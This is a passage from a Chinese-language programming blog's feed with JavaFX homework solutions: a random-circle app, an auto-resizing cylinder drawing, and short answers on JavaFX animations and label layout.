        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>pane<span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Random Circle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">setPositionAndColor</span><span class="token punctuation">(</span><span class="token class-name">Circle</span> circle<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Random</span> rand <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置随机位置</span>
        <span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">20</span> <span class="token operator">+</span> rand<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">double</span> y <span class="token operator">=</span> <span class="token number">20</span> <span class="token operator">+</span> rand<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        circle<span class="token punctuation">.</span><span class="token function">setCenterX</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
        circle<span class="token punctuation">.</span><span class="token function">setCenterY</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置随机颜色</span>
        <span class="token keyword">double</span> r <span class="token operator">=</span> rand<span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">double</span> g <span class="token operator">=</span> rand<span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">double</span> b <span class="token operator">=</span> rand<span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        circle<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Color</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> g<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/piZprWt.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/26/piZprWt.png'">
<img src="/images/posts/piZpDJI.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/26/piZpDJI.png'">
<h2 id="自动改变大小的圆柱重写编程练习题-1410-当窗体改变大小的时候圆柱的宽度和高度自动改变大小"><a class="markdownIt-Anchor" href="#自动改变大小的圆柱重写编程练习题-1410-当窗体改变大小的时候圆柱的宽度和高度自动改变大小"></a> (自动改变大小的圆柱)重写编程练习题 14.10, 当窗体改变大小的时候，圆柱的宽度和高度自动改变大小</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Group</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">BorderPane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Arc</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">ArcType</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Ellipse</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Line</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AutoCylinder</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span><span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">BorderPane</span> pane <span class="token operator">=</span> <span class="token function">getPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>pane<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// 初始化圆柱</span>
        <span class="token function">resizeCylinder</span><span class="token punctuation">(</span>pane<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 注册窗体大小改变事件</span>
        scene<span class="token punctuation">.</span><span class="token function">widthProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addListener</span><span class="token punctuation">(</span><span class="token punctuation">(</span>observable<span class="token punctuation">,</span> oldValue<span class="token punctuation">,</span> newValue<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token function">resizeCylinder</span><span class="token punctuation">(</span>pane<span class="token punctuation">,</span> newValue<span class="token punctuation">.</span><span class="token function">doubleValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> scene<span class="token punctuation">.</span><span class="token function">getHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        scene<span class="token punctuation">.</span><span class="token function">heightProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addListener</span><span class="token punctuation">(</span><span class="token punctuation">(</span>observable<span class="token punctuation">,</span> oldValue<span class="token punctuation">,</span> newValue<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token function">resizeCylinder</span><span class="token punctuation">(</span>pane<span class="token punctuation">,</span> scene<span class="token punctuation">.</span><span class="token function">getWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> newValue<span class="token punctuation">.</span><span class="token function">doubleValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"显示圆柱"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/** 返回圆柱面板 */</span>
    <span class="token keyword">private</span> <span class="token class-name">BorderPane</span> <span class="token function">getPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">BorderPane</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/** 改变圆柱大小 */</span>
    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">resizeCylinder</span><span class="token punctuation">(</span><span class="token class-name">BorderPane</span> pane<span class="token punctuation">,</span> <span class="token keyword">double</span> width<span class="token punctuation">,</span> <span class="token keyword">double</span> height<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Group</span> group <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">double</span> <span class="token constant">X0</span> <span class="token operator">=</span> width <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token keyword">double</span> <span class="token constant">Y0</span> <span class="token operator">=</span> height <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">;</span>
        <span class="token keyword">double</span> cylinderHeight <span class="token operator">=</span> height <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token keyword">double</span> radiusX <span class="token operator">=</span> width <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">;</span>
        <span class="token keyword">double</span> radiusY <span class="token operator">=</span> height <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span>

        <span class="token class-name">Ellipse</span> topEllipse <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ellipse</span><span class="token punctuation">(</span><span class="token constant">X0</span><span class="token punctuation">,</span> <span class="token constant">Y0</span><span class="token punctuation">,</span> radiusX<span class="token punctuation">,</span> radiusY<span class="token punctuation">)</span><span class="token punctuation">;</span>
        topEllipse<span class="token punctuation">.</span><span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token string">"-fx-stroke: black; -fx-fill: white;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Arc</span> dashArc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Arc</span><span class="token punctuation">(</span><span class="token constant">X0</span><span class="token punctuation">,</span> <span class="token constant">Y0</span> <span class="token operator">+</span> cylinderHeight<span class="token punctuation">,</span> radiusX<span class="token punctuation">,</span> radiusY<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        dashArc<span class="token punctuation">.</span><span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token string">"-fx-fill: white; -fx-stroke: black;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        dashArc<span class="token punctuation">.</span><span class="token function">getStrokeDashArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token number">6.0</span><span class="token punctuation">,</span> <span class="token number">21.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        dashArc<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token class-name">ArcType</span><span class="token punctuation">.</span><span class="token constant">OPEN</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Arc</span> solidArc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Arc</span><span class="token punctuation">(</span><span class="token constant">X0</span><span class="token punctuation">,</span> <span class="token constant">Y0</span> <span class="token operator">+</span> cylinderHeight<span class="token punctuation">,</span> radiusX<span class="token punctuation">,</span> radiusY<span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        solidArc<span class="token punctuation">.</span><span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token string">"-fx-fill: white; -fx-stroke: black;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        solidArc<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token class-name">ArcType</span><span class="token punctuation">.</span><span class="token constant">OPEN</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Line</span> left <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Line</span><span class="token punctuation">(</span><span class="token constant">X0</span> <span class="token operator">-</span> radiusX<span class="token punctuation">,</span> <span class="token constant">Y0</span><span class="token punctuation">,</span> <span class="token constant">X0</span> <span class="token operator">-</span> radiusX<span class="token punctuation">,</span> <span class="token constant">Y0</span> <span class="token operator">+</span> cylinderHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Line</span> right <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Line</span><span class="token punctuation">(</span><span class="token constant">X0</span> <span class="token operator">+</span> radiusX<span class="token punctuation">,</span> <span class="token constant">Y0</span><span class="token punctuation">,</span> <span class="token constant">X0</span> <span class="token operator">+</span> radiusX<span class="token punctuation">,</span> <span class="token constant">Y0</span> <span class="token operator">+</span> cylinderHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>

        group<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>topEllipse<span class="token punctuation">,</span> dashArc<span class="token punctuation">,</span> solidArc<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pane<span class="token punctuation">.</span><span class="token function">setCenter</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/piZpySP.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/26/piZpySP.png'">
<img src="/images/posts/piZpcy8.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/26/piZpcy8.png'">
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Java作业-7</title>
    <url>/2023/11/02/06-52-33/</url>
    <content><![CDATA[<p>JavaFX动画</p>
<span id="more"></span>
<h2 id="如何将一个动画的循环次数设置为无限次如何自动倒转一个动画如何开始-暂停以及停止一个动画"><a class="markdownIt-Anchor" href="#如何将一个动画的循环次数设置为无限次如何自动倒转一个动画如何开始-暂停以及停止一个动画"></a> 如何将一个动画的循环次数设置为无限次？如何自动倒转一个动画？如何开始、暂停以及停止一个动画？</h2>
<ul>
<li><code>animation.setCycleCount(Animation.INDEFINITE);</code></li>
<li><code>animation.setAutoReverse(true);</code></li>
<li><code>animation.play();</code></li>
<li><code>animation.pause();</code></li>
<li><code>animation.stop();</code></li>
</ul>
<h2 id="如何创建一个pathtransition如何创建一个fadetransition如何创建一个timeline"><a class="markdownIt-Anchor" href="#如何创建一个pathtransition如何创建一个fadetransition如何创建一个timeline"></a> 如何创建一个PathTransition？如何创建一个FadeTransition？如何创建一个Timeline？</h2>
<p><code>PathTransition</code>是一种沿着指定路径移动节点的动画。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 创建一个圆形节点</span>
<span class="token class-name">Circle</span> circle <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">RED</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 创建一个路径</span>
<span class="token class-name">Path</span> path <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
path<span class="token punctuation">.</span><span class="token function">getElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MoveTo</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
path<span class="token punctuation">.</span><span class="token function">getElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LineTo</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 创建PathTransition动画</span>
<span class="token class-name">PathTransition</span> pathTransition <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PathTransition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
pathTransition<span class="token punctuation">.</span><span class="token function">setDuration</span><span class="token punctuation">(</span><span class="token class-name">Duration</span><span class="token punctuation">.</span><span class="token function">seconds</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
pathTransition<span class="token punctuation">.</span><span class="token function">setPath</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
pathTransition<span class="token punctuation">.</span><span class="token function">setNode</span><span class="token punctuation">(</span>circle<span class="token punctuation">)</span><span class="token punctuation">;</span>
pathTransition<span class="token punctuation">.</span><span class="token function">setCycleCount</span><span class="token punctuation">(</span><span class="token class-name">PathTransition</span><span class="token punctuation">.</span><span class="token constant">INDEFINITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
pathTransition<span class="token punctuation">.</span><span class="token function">setAutoReverse</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
pathTransition<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>FadeTransition</code>是一种改变节点透明度的动画。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 创建一个矩形节点</span>
<span class="token class-name">Rectangle</span> rect <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Rectangle</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">BLUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 创建FadeTransition动画</span>
<span class="token class-name">FadeTransition</span> fadeTransition <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FadeTransition</span><span class="token punctuation">(</span><span class="token class-name">Duration</span><span class="token punctuation">.</span><span class="token function">seconds</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> rect<span class="token punctuation">)</span><span class="token punctuation">;</span>
fadeTransition<span class="token punctuation">.</span><span class="token function">setFromValue</span><span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
fadeTransition<span class="token punctuation">.</span><span class="token function">setToValue</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
fadeTransition<span class="token punctuation">.</span><span class="token function">setCycleCount</span><span class="token punctuation">(</span><span class="token class-name">FadeTransition</span><span class="token punctuation">.</span><span class="token constant">INDEFINITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
fadeTransition<span class="token punctuation">.</span><span class="token function">setAutoReverse</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
fadeTransition<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>Timeline</code>是一种可以自定义关键帧的动画。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 创建一个矩形节点</span>
<span class="token class-name">Rectangle</span> rect <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Rectangle</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">GREEN</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 创建Timeline动画</span>
<span class="token class-name">Timeline</span> timeline <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Timeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
timeline<span class="token punctuation">.</span><span class="token function">setCycleCount</span><span class="token punctuation">(</span><span class="token class-name">Timeline</span><span class="token punctuation">.</span><span class="token constant">INDEFINITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
timeline<span class="token punctuation">.</span><span class="token function">setAutoReverse</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 添加关键帧</span>
<span class="token class-name">KeyFrame</span> kf1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KeyFrame</span><span class="token punctuation">(</span><span class="token class-name">Duration</span><span class="token punctuation">.</span><span class="token function">seconds</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">KeyValue</span><span class="token punctuation">(</span>rect<span class="token punctuation">.</span><span class="token function">xProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">KeyFrame</span> kf2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KeyFrame</span><span class="token punctuation">(</span><span class="token class-name">Duration</span><span class="token punctuation">.</span><span class="token function">seconds</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">KeyValue</span><span class="token punctuation">(</span>rect<span class="token punctuation">.</span><span class="token function">xProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
timeline<span class="token punctuation">.</span><span class="token function">getKeyFrames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>kf1<span class="token punctuation">,</span> kf2<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 播放动画</span>
timeline<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="如何在一个标签中将文本放在节点的右侧"><a class="markdownIt-Anchor" href="#如何在一个标签中将文本放在节点的右侧"></a> 如何在一个标签中将文本放在节点的右侧？</h2>
<p>通过<code>Label</code>的<code>setGraphic</code>和<code>setContentDisplay</code>方法<br>
通过<code>setContentDisplay</code>方法设置内容显示的位置为<code>ContentDisplay.RIGHT</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LabelExample</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">launch</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Label Example"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个标签</span>
        <span class="token class-name">Label</span> label <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"This is a label"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个图像视图节点</span>
        <span class="token class-name">Image</span> image <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token string">"path/to/your/image/file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ImageView</span> imageView <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ImageView</span><span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">;</span>
        imageView<span class="token punctuation">.</span><span class="token function">setFitHeight</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        imageView<span class="token punctuation">.</span><span class="token function">setFitWidth</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 将图像视图设置为标签的图形</span>
        label<span class="token punctuation">.</span><span class="token function">setGraphic</span><span class="token punctuation">(</span>imageView<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置内容显示的位置</span>
        label<span class="token punctuation">.</span><span class="token function">setContentDisplay</span><span class="token punctuation">(</span><span class="token class-name">ContentDisplay</span><span class="token punctuation">.</span><span class="token constant">RIGHT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置标签的字体</span>
        label<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Font</span><span class="token punctuation">(</span><span class="token string">"Arial"</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个垂直布局</span>
        <span class="token class-name">VBox</span> vbox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span>label<span class="token punctuation">)</span><span class="token punctuation">;</span>
        vbox<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个场景</span>
